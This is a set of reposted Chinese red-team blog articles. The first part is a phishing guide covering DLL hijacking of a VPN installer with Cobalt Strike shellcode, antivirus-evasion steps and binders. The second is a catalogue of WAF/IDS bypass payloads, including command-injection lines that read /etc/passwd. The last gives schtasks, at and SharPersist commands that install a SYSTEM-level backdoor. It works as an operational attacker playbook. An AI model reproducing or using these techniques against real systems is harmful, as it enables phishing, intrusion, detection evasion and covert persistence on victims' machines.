<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006584.jpeg" alt="图片"></p>
<p>使用方法：</p>
<p>1.输入CS或者msf生成的shellcode生成免杀DLL文件</p>
<p>2.添加需要劫持的软件或者dll</p>
<p>3.劫持过后会在运行目录生成一个DLL和配置文件</p>
<p>4.需要把两个文件放在被劫持的软件同目录下才可以运行</p>
<p>注意：</p>
<p>本文采用EasyConnectInstaller做测试，使用其他软件测试的话，可以使用Process Monitor来对系统进程进行监控，找到系统程序调用DLL的情况</p>
<blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon</a></p>
</blockquote>
<p>参考文章：</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_35771144/article/details/111056447">https://blog.csdn.net/weixin_35771144/article/details/111056447</a></p>
</blockquote>
<p>使用CS生成shellcode</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006685.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006686.jpeg" alt="图片"></p>
<p>把shellcode放入工具然后生成dll即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006687.jpeg" alt="图片"></p>
<p>选择DLL处选择生成的DLL</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006688.jpeg" alt="图片"></p>
<p>注入目标为</p>
<p>C:\Program Files (x86)\Sangfor\SSL\SangforCSClient 下的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006689.jpeg" alt="图片"></p>
<p>注入到注册表后，将 wwwcomw.dll 和 conf.inf 放入到软件目录下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006790.jpeg" alt="图片"></p>
<p>然后运行即可上线</p>
<p>然后接下来使用NSIS重新制作安装包</p>
<p>使用NSIS制作安装包可以参考： <a href="https://www.cnblogs.com/modou/p/3573772.html">https://www.cnblogs.com/modou/p/3573772.html</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006791.jpeg" alt="图片"></p>
<h3 id="9）免杀思路"><a href="#9）免杀思路" class="headerlink" title="9）免杀思路"></a>9）免杀思路</h3><p>1、CS生成exe的payload</p>
<p>2、exe-payload 放置公网服务器</p>
<p>3、再CS生成python-payload</p>
<p>4、将python-payload转base64值</p>
<p>5、base64值的payload再用序列化转码</p>
<p>6、序列化转码后的payload再用反序列化转码</p>
<p>7、转成反序列化后的payload再用python3的tinyaes混淆</p>
<p>8、混淆完再用另外的东西加壳成对方环境执行的文件类型即可</p>
<p>可以查查掩日</p>
<p>最终形成的文件类型，执行的原理仅仅是运行下载公网服务器第一步上次的payload并运行</p>
<p>GoFildBinder</p>
<p><a href="https://github.com/Yihsiwei/GoFileBinder">https://github.com/Yihsiwei/GoFileBinder</a></p>
<p>golang免杀捆绑器 捆绑器免杀效果会持续更新下去</p>
<p>使用以下命令进行捆绑器编译</p>
<p>go build GoFileBinder.go</p>
<p>使用以下命令生成捆绑文件(注：GoFileBinder.exe单独放入一个文件夹中)</p>
<p>GoFileBinder.exe 木马.exe xxx.txt</p>
<p>也可以尝试使用kali自带的upx</p>
<h2 id="4、邮件钓鱼"><a href="#4、邮件钓鱼" class="headerlink" title="4、邮件钓鱼"></a>4、邮件钓鱼</h2><p>包含邮件服务器相关环境搭建，邮件信息收集，参考：</p>
<p><a href="https://www.freebuf.com/articles/web/260391.html">https://www.freebuf.com/articles/web/260391.html</a></p>
<h2 id="5、flash钓鱼"><a href="#5、flash钓鱼" class="headerlink" title="5、flash钓鱼"></a>5、flash钓鱼</h2><p>源码： <a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></p>
<p>尝试自解压或者配合捆绑</p>
<h2 id="6、网站钓鱼"><a href="#6、网站钓鱼" class="headerlink" title="6、网站钓鱼"></a>6、网站钓鱼</h2><p>制作钓鱼网站，克隆网站</p>
<p>cs,msf 都有这个功能</p>
<p>setoolkit</p>
<p>本文作者：YLion， 转载请注明来自FreeBuf.COM</p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>红队攻击-绕过waf以及IDS等流量设备</title>
    <url>/posts/5a4257e.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/MHxomRzX8Y40YXuCUpp_Yg">https://mp.weixin.qq.com/s/MHxomRzX8Y40YXuCUpp_Yg</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>2021年了，现在渗透的越来越难了，刚打的shell，过一会就没了，现在的流量设备，安全设备一个比一个流弊，payload一过去就面临着封禁，为了对抗设备，一些大佬们总结出很多绕过这种基于签名的<em>WAF 或 IDS</em> 的手法，为什么叫基于签名的？因为这种设备也是检查数据包中一些特征字符，比如什么and 1&#x3D;1 什么的，但是肯定不会这么简单的，除了几个黑名单的固定的特征字符，很多都是那种通过正则去匹配特征字符的，这也是造成绕过可能性的原因。</p>
<h2 id="常规手法"><a href="#常规手法" class="headerlink" title="常规手法"></a><strong>常规手法</strong></h2><h3 id="1-直接通过真实ip访问"><a href="#1-直接通过真实ip访问" class="headerlink" title="1.直接通过真实ip访问"></a><strong>1.直接通过真实ip访问</strong></h3><p>这是一种对待云waf最有效的办法，只要找到做cdn的之前的真实ip，那么直接通过ip访问，则会使云waf完全失效，web应用服务器失去云保护。</p>
<h4 id="1-1-怎么找到真实ip？"><a href="#1-1-怎么找到真实ip？" class="headerlink" title="1.1 怎么找到真实ip？"></a><strong>1.1 怎么找到真实ip？</strong></h4><p>手法挺多的，我比较常用的，就是直接把网站的titile给取下来放到一些搜索引擎搜索，比如在fofa中搜索网站titile，一般都能找到，钟馗之眼也不错，当然手法很多，找比较实用的就行。</p>
<h4 id="1-2-通过ip去访问一些网站，可能提示web页面找不到？"><a href="#1-2-通过ip去访问一些网站，可能提示web页面找不到？" class="headerlink" title="1.2 通过ip去访问一些网站，可能提示web页面找不到？"></a><strong>1.2 通过ip去访问一些网站，可能提示web页面找不到？</strong></h4><p>究其原因是，有些网站在路由上直接使用的域名为硬路由，这时候需要修改host 解析文件，把相关域名和真实ip 给对应上填上，再用域名去访问。</p>
<p>linux host文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>

<p>windows host文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc</span><br></pre></td></tr></table></figure>

<h3 id="2-切换协议"><a href="#2-切换协议" class="headerlink" title="2.切换协议"></a><strong>2.切换协议</strong></h3><p>通过切换http到https，或者https切换到http，如果web站点没有进行强制https访问，那么http也能访问到其站点，如果waf错误配置，也能起到一点效果（方法比较特殊），还可以通过增加www，或者删除www前坠有时也管用。</p>
<h3 id="3-通过IPv6-访问"><a href="#3-通过IPv6-访问" class="headerlink" title="3.通过IPv6 访问"></a><strong>3.通过IPv6 访问</strong></h3><p>有许多入侵检测系统也只监控 IPv4 流量，没有对IPv6 进行监控。</p>
<p>访问格式：http:&#x2F;&#x2F;[ipv6地址]:80&#x2F;index.html</p>
<p>ipv6为：2001:470:c:1818::2</p>
<p>访问地址：http:&#x2F;&#x2F;[2001:470:c:1818::2]:80&#x2F;index.html</p>
<h3 id="4-对http包头进行修改"><a href="#4-对http包头进行修改" class="headerlink" title="4.对http包头进行修改"></a><strong>4.对http包头进行修改</strong></h3><p>方法之一就是添加以下标头： </p>
<ul>
<li>X-forwarded-for</li>
<li>X-remote-IP</li>
<li>X-originating-IP</li>
<li>x-remote-addr</li>
<li>x-client-ip</li>
</ul>
<p>例如：</p>
<p>X-Originating-IP: 127.0.0.1</p>
<p>在一些做了访客流量负载的web架构很常见，他并不是把web服务器映射出去，而是把外面的访问流量通过一台流量转发机器转发到内网web应用服务器，这种形式的话，在转发进来的数据包中就会出现X-forwarded-for 等字段，标示着是哪个ip访问的web服务。</p>
<p>如果包存在：</p>
<ul>
<li>Content-Type: text&#x2F;html</li>
</ul>
<p>那么可以尝试做以下修改：</p>
<ul>
<li>Content-Type:      #直接删除类型值</li>
<li>Content-Type: text&#x2F;htmlzzzzzzzzz  #错误的类型值</li>
<li>Content-Type: application&#x2F;octet-stream #其他类型值</li>
</ul>
<p>有时候将 MIME 类型设置为 multipart&#x2F;form 数据然后对请求进行错误处理也有奇效。</p>
<ul>
<li>Content-Type: multipart&#x2F;form-data ; boundary&#x3D;0000</li>
<li>Content-Type: mUltiPart&#x2F;ForM-dATa; boundary&#x3D;0000</li>
<li>Content-Type: multipart&#x2F;form-datax; boundary&#x3D;0000</li>
<li>Content-Type: multipart&#x2F;form-data, boundary&#x3D;0000</li>
<li>Content-Type: multipart&#x2F;form-data boundary&#x3D;0000</li>
<li>Content-Type: multipart&#x2F;whatever; boundary&#x3D;0000</li>
<li>Content-Type: multipart&#x2F;; boundary&#x3D;0000</li>
</ul>
<p>对HTTP方法进行更改：</p>
<p>把get 改成post ，post改成get，或者直接改成put</p>
<p>有时候错误方法也能成功访问</p>
<p>请求可以通过“GETS”而不是“GET”发送，并且在许多情况下仍会按预期运行。</p>
<p>特别是在 PHP 中，根据配置，cookie 值可以被视为参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php</span><br><span class="line">cookie: cmd1=;cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>还有的是就是把http协议 1.1 改成1.0 ，因为大部分服务器也支持1.0版本。</p>
<h3 id="5-对参数操作"><a href="#5-对参数操作" class="headerlink" title="5 对参数操作"></a><strong>5 对参数操作</strong></h3><p>参数名称可以通过多种方式进行操作，具体服务器上运行的服务器端语言，还有取决于服务器的特性，这里讲一下php和asp的绕过。</p>
<h4 id="1-通过硬编码值造成绕过"><a href="#1-通过硬编码值造成绕过" class="headerlink" title="1.通过硬编码值造成绕过"></a>1.通过硬编码值造成绕过</h4><p>PHP 中的 **+**符号可用于实现此目的，而 ASP 中的 <strong>%</strong> 符号将实现类似的结果</p>
<p>在 ASP 中，可以将无效的 URL 编码添加到参数名称中（请注意，编码必须无效才能正常工作）</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?%value=payload/cmd/a.php?%&#125;9value=payload</span><br></pre></td></tr></table></figure>

<p>在 PHP 中，加号可以达到同样的效果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?+value=payload</span><br></pre></td></tr></table></figure>

<h4 id="2-多个参数（HTTP参数污染）"><a href="#2-多个参数（HTTP参数污染）" class="headerlink" title="2. 多个参数（HTTP参数污染）"></a>2. 多个参数（HTTP参数污染）</h4><p>在php中，如果遇到多个参数，那么是从右到左来取参数值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?value=1111111111111111111111111111&amp;value=payload</span><br></pre></td></tr></table></figure>

<p>又比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?value=payload&amp;value=payload</span><br></pre></td></tr></table></figure>

<p>又比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?page=cat /etc/passswd&amp;page=</span><br></pre></td></tr></table></figure>

<p>又比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php? page=cat&amp;page=/etc/passswd&amp;page=/passwd</span><br></pre></td></tr></table></figure>

<p>在保证结果正确的情况下，想怎么玩就怎么玩</p>
<h4 id="3-利用服务器特性"><a href="#3-利用服务器特性" class="headerlink" title="3.利用服务器特性"></a>3.利用服务器特性</h4><p>比如windows 的特性可以在文件名之后加_等符号，linux 加‘</p>
<h3 id="6-通过控制字符"><a href="#6-通过控制字符" class="headerlink" title="6.通过控制字符"></a><strong>6.通过控制字符</strong></h3><p>这些控制字符包括</p>
<ul>
<li>%0d <strong>(CR)</strong></li>
<li>%0a <strong>(LF)</strong></li>
<li>%0d%0a <strong>(CRLF)</strong></li>
<li>%09</li>
<li>%0B</li>
<li>%00</li>
</ul>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/file.txt</span><br></pre></td></tr></table></figure>

<p>改成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/file%00.txt</span><br></pre></td></tr></table></figure>

<p>对于有一些waf很实用。</p>
<h3 id="7-通过变换路径来bypass"><a href="#7-通过变换路径来bypass" class="headerlink" title="7.通过变换路径来bypass"></a><strong>7.通过变换路径来bypass</strong></h3><p>一些waf 或者web应用通过web路由进行封禁，体现为访问某个特定的url路径为403 等状态。</p>
<p>但是通过url路径的特性，能进行绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path//vuln.php </span><br><span class="line">/////////////////路径//////////////// vuln.php?value=PAYLOAD #在php中</span><br><span class="line">/path/./vuln.php?value=PAYLOAD</span><br><span class="line">/path/blah/../vuln.php?value=PAYLOAD </span><br><span class="line">/path/blah/blah/blah/../../../vuln.php?value=PAYLOAD </span><br><span class="line">/PaTh/VULN.PHP?VaLuE=PAYLOAD #windows大小写不分</span><br></pre></td></tr></table></figure>

<p>通过中间件的特性，在 Apache Tomcat中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path;/vuln.php?value=PAYLOAD</span><br><span class="line">/path/;lol=lol/vuln.php?value=PAYLOAD</span><br></pre></td></tr></table></figure>

<p>PATH_INFO（通过 Apache 设置的环境变量）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vuln/vuln.php/lolol?value=PAYLOAD</span><br><span class="line">/path/vuln.php;lol=lol?value=PAYLOAD</span><br></pre></td></tr></table></figure>

<p>等。。。。。。</p>
<p>姿势列举不完的，灵活组合才是最强姿势。</p>
<p><strong>8.分块传输</strong></p>
<p>注意：</p>
<p>1.只有HTTP&#x2F;1.1支持分块传输</p>
<p>2.POST包都支持分块，不局限仅仅于反序列化和上传包</p>
<p>3.Transfer-Encoding: chunked大小写不敏感</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github：</span><br><span class="line">https://github.com/c0ny1/chunked-coding-converter/releases/tag/0.4.0</span><br></pre></td></tr></table></figure>

<p><strong>8.1 通过burp chrunk插件分块编码传输</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E6%94%BB%E5%87%BB-%E7%BB%95%E8%BF%87waf%E4%BB%A5%E5%8F%8AIDS%E7%AD%89%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87/640.png" alt="图片"></p>
<p>分包后</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E6%94%BB%E5%87%BB-%E7%BB%95%E8%BF%87waf%E4%BB%A5%E5%8F%8AIDS%E7%AD%89%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87/640-16544969262461.png" alt="图片"></p>
<p>此方法主要是把一些关键字给拆开，当然你也可以通过手动编码进行调整，编码过程中长度需包括空格的长度，最后用0表示编码结束。</p>
<p><strong>8.2 延时分块</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详情参考</span><br><span class="line">https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/</span><br></pre></td></tr></table></figure>

<p><strong>9.垃圾数据</strong></p>
<p>遇到什么waf，都是大包绕，绕不过，那就是包不够大，继续填充！！</p>
<p>并不是随意填充垃圾数据，而是填一些不影响结果的数据，比如遇到php站</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post参数为username=admin&#x27;</span><br></pre></td></tr></table></figure>

<p>那么填充垃圾数据可为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&amp;username=admin&#x27;</span><br></pre></td></tr></table></figure>

<p>填充到waf不再拦截为止。</p>
<p>还有通过语言的注释语句填充，例如如果是xml 上传，则可以使用xml中的注释语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad --&gt;</span><br></pre></td></tr></table></figure>

<p>把这样的语法放在payload前面，填充到bypass waf为止</p>
<p>如果是反序列化包，可以参考这篇文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持（二）</title>
    <url>/posts/b0237af4.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/p4H46jY-68PA8uKZ-e4kHQ">https://mp.weixin.qq.com/s/p4H46jY-68PA8uKZ-e4kHQ</a></p>
</blockquote>
<h2 id="4-Windows-计划任务后门"><a href="#4-Windows-计划任务后门" class="headerlink" title="4.Windows 计划任务后门"></a><strong>4.Windows 计划任务后门</strong></h2><p>计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制 权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。</p>
<p><strong>1. 利用 at 命令</strong></p>
<p>at 命令是Windows自带的用于创建计划任务的命令，但是他主要工作在Windows Server 2008之前版本 的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间 执行木马程序，从而获得对内网目标主机的控制。 </p>
<p>（1）首先在目标主机上传metasploit生成的后门程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JjSqeGvlpQCgVDELDlFkh9dmYicaGXoPYuamRg1j9yaWYfmvT2ZldTDA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>（2）然后进入目标主机的shell使用net time命令确定目标主机的当前时间： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JGF6o31qtCydMicBpiav5WGMLyqZfG68iaGt2nHmMFh8VrWibTpajHiaVSTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>（3）接着在目标主机的shell中使用at命令创建计划任务，让目标主机在指定的时间运行metasploit木马 程序：如上图所示，计划任务创建成功，目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这 个时间获得目标机器的控制权： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JyiaoUH6X9N8SjK9icAjxB0ibaZtywnA7uib6Ikul49APSiboDuvuJj4jFjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>如上图所示，计划任务创建成功，目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这 个时间获得目标机器的控制权：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JCRlYVw8vnPb9IDVj2Micc1HibUaGqgicLuQ1SLI52ajRv3ibLBvUaogBQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>2. 利用 schtasks 命令</strong></p>
<p>上面我们讲了用at命令创建计划任务，但是该命令已经被Windows Vista、Windows Server 2008及之 后版本的操作系统废弃了，代替他的是schtasks命命令。schtasks命令比at命令更为灵活、自由。下面 来演示schtasks命令的使用，于是，攻击者开始使用schtasks命令来代替at命令。 利用schtasks创建后门的大致流程如下：</p>
<p>（1）首先在目标主机上传metasploit生成的后门程序。 </p>
<p>（2）然后在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序 为我们之前到C盘下的backdoor.exe，启动权限为system。</p>
<p>命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn backdoor /sc minute /mo 1 /tr c:\windows\system32\backdoor.exe /ru system /f</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JPlvdvz3mzRWvBQ8PcfQjHdzswyaXN4dDictDW12Ng0XIN0qjBQCzvnA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>然后新开一个metasploit监听，等待一分钟后这个监听便收到了目标主机的session：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9Jf50ydYL8n5A4JzTFWGMSqb3gBgnu2rXRphOVI8fwYicoOuglafJTVEw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>并且这个session还是system权限的。</p>
<p><strong>3. 利用SharPersist工具</strong> </p>
<p>下载地址：</p>
<p><em><a href="https://github.com/fireeye/SharPersist/releases">https://github.com/fireeye/SharPersist/releases</a> <a href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a></em></p>
<p>SharPersist的创建是为了帮助使用多种不同的技术在Windows操作系统上建立持久性。它是一个国外安全人员用C#编写的命令行工具，可以反射性的加载Cobalt Strike的“execute-assembly”命令或任何其他 支持反射性加载.NET程序集的框架。SharPersist采用模块化设计，以便将来添加新的持久性技术。还有 一些与tradecraft相关的项已经内置到该工具及其支持的持久性技术中，例如file time stomping策略和最小化或隐藏运行应用程序。该工具支持的持久性技术有：</p>
<p><strong>keepass-keepass配置文件后门</strong> </p>
<p><strong>reg-注册表项添加&#x2F;修改</strong> </p>
<p><strong>schtaskbackdoor-通过向后门计划任务添加其他操作来完成该任务</strong></p>
<p><strong>startupfolder-启动文件夹中的lnk文件</strong></p>
<p><strong>tortoisesvn-乌龟svn钩子脚本</strong></p>
<p><strong>service-创建新的Windows服务</strong></p>
<p><strong>schtask-创建新的计划任务</strong></p>
<p>如果用户具有管理员级别的特权，则可以通过SharPersist工具创建一个新的计划任务，该任务将在 Windows登录期间执行我们上传好的有效载荷。</p>
<p>（1）在目标主机上传我们新生成的metasploit木马和SharPersist程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827204179.png" alt="图片"></p>
<p>（2）然后使用以下命令创建我们恶意的计划任务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharPersist.exe -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Administrator\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add -o logon</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9J9SfUChDohd8kVbEp6bqJerWcUlYyG5UUyCW70C3ESZlCWJFtGO2RfA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>然后新开一个metasploit监听，等待目标主机重启后便可以收到目标主机的session，并且还是system 权限的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JWQSp5GsctMzqXEcj6AiaAuU4yRRXD6n5QVTSH8xIT04MZ4GcMMfiaRyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
